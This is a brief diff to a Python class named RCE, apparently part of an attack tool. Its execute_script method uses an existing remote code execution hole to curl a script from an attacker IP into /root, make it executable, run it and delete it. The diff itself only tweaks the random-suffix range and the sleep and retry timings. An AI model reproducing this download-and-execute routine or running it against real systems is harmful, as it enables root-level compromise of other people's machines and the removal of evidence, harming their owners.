@@ -26,16 +26,16 @@ class RCE(object):
 
     def execute_script(self, scriptname):
         for _ in range(10):
-            rand = randint(1, 9999)
+            rand = randint(1, 999)
             try:
                 self.execute_cmd(f"curl {self.attacker_ip}/get_script/{scriptname} -o /root/cmd_{rand}")
                 self.execute_cmd(f"chmod 777 /root/cmd_{rand}")
                 self.execute_cmd(f"/root/cmd_{rand}")
-                time.sleep(5)
+                time.sleep(2)
                 self.execute_cmd(f"rm -f /root/cmd_{rand}")
                 print(f"Script executed {scriptname}", flush=True)
                 break
             except Exception as e:
                 print("ERROR! Retrying in 15s", flush=True)
                 print(e, flush=True)
-                time.sleep(15)
+                time.sleep(10)
